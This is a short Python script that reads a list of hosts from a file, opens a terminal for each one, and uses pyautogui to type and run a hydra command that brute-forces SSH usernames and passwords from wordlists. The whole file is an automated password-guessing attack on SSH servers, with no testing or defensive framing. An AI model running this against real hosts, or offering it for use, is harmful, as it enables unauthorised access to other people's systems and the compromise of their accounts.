import os
import pyautogui


if 'ssh_local.txt' in os.listdir():
    for el in open('ssh_local.txt').readlines():
        os.system(f'gnome-terminal')
        os.getcwd()
        # cd to our directory
        pyautogui.typewrite(f"cd {os.getcwd()}")
        pyautogui.press('enter')
        # bruteforce passwords
        pyautogui.typewrite(f"hydra -f -L ssh_bruteforce/kali.txt -P ssh_bruteforce/wordlist.txt ssh://{el.rstrip()}")
        pyautogui.press('enter')
